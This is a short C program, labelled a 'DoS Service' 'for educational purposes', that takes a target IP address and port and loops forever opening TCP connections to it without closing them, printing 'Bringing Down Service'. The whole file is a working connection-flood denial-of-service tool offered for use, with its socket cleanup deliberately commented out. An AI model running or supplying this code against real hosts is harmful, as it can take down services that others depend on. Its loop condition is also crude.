#include <stdlib.h>
#include <stdio.h>
#include <netdb.h>

int main(int argc, char *argv[]){

	int meusocket;
	int conecta;
	int porta;
	char * ip;

	if(argv[1] == 0 || argv[2] == 0){
	        printf("\033[0;32m*****************************\n");
		printf("*        DoS Service         *\n");
		printf("*  For educational purposes  *\n");
		printf("*     - by Gian Viana -      *\n");
		printf("*****************************\033[0;32m\n");      
		
		printf("\033[5m\033[1;31m[+]WARNING[+]\033[0m \n");
		printf("\033[0;32mUsage: %s  192.168.0.1 80\033[0;32m \n",argv[0] );
	}else{
		ip    = argv[1];
		porta = atoi(argv[2]);

		struct sockaddr_in alvo;
		while(ip != "never"){

			meusocket = socket(AF_INET, SOCK_STREAM, 0);
			alvo.sin_family = AF_INET;
			alvo.sin_port = htons(porta);
			alvo.sin_addr.s_addr = inet_addr(ip);

			conecta = connect(meusocket, (struct sockaddr* )&alvo, sizeof alvo);

			if(conecta == 0){
				printf("Bringing Down Service\n");
			}/*else{
				close(meusocket);
				close(conecta);
			}*/
		}
	}
}
